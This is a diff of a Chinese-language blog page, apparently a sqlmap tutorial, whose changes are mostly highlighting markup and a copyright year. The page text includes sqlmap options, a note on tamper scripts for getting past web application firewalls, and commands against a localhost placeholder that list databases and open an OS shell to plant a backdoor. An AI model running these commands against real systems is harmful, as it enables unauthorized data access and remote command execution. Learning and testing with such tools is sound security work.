@@ -22,7 +22,6 @@ if (!doNotTrack) {
 </script>
 
 
-
 <link rel="icon" type="image/png" href="/favicon.png">
 
 
@@ -108,12 +107,12 @@ if (!doNotTrack) {
 <li><code>-T3</code> 用於調整請求速度，越小請求越慢</li>
 </ul>
 <p>提昇風險注入</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">--level=3 --risk=3
-</code></pre></div><p>設定cookie</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">--cookie=&#39;PHPSESSID=XXXX&#39;
-</code></pre></div><p>指定DBMS</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-plaintext" data-lang="plaintext">--dbms MySQL
-</code></pre></div><h2 id="tamper">tamper</h2>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>--level=3 --risk=3
+</span></span></code></pre></div><p>設定cookie</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>--cookie=&#39;PHPSESSID=XXXX&#39;
+</span></span></code></pre></div><p>指定DBMS</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-plaintext" data-lang="plaintext"><span style="display:flex;"><span>--dbms MySQL
+</span></span></code></pre></div><h2 id="tamper">tamper</h2>
 <p>編寫tamper並且放到<code>sqlmap/tamper/</code>。
 透過參數<code>--tamper tamper.py</code>啟用tamper，可以針對
 不同waf進行改變，例如<code>Content-Type</code>使用不同編碼繞過waf。</p>
@@ -128,10 +127,10 @@ if (!doNotTrack) {
 </ul>
 <h2 id="利用">利用</h2>
 <p>獲取資料表</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#39;https://localhost/sql-inj.php?inj=1&#39;</span> -dbs
-</code></pre></div><p>值入後門</p>
-<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-bash" data-lang="bash">sqlmap -u <span style="color:#e6db74">&#39;https://localhost/sql-inj.php?inj=1&#39;</span> --os-shell
-</code></pre></div>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#39;https://localhost/sql-inj.php?inj=1&#39;</span> -dbs
+</span></span></code></pre></div><p>值入後門</p>
+<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-bash" data-lang="bash"><span style="display:flex;"><span>sqlmap -u <span style="color:#e6db74">&#39;https://localhost/sql-inj.php?inj=1&#39;</span> --os-shell
+</span></span></code></pre></div>
 
     
       <hr>
@@ -183,7 +182,7 @@ if (!doNotTrack) {
     <a href="/tags" class="footer">Tags</a>
   </div>
   <div>
-    r888800009©2018-2022.
+    r888800009©2018-2023.
     All Rights Reserved.
   </div>
   
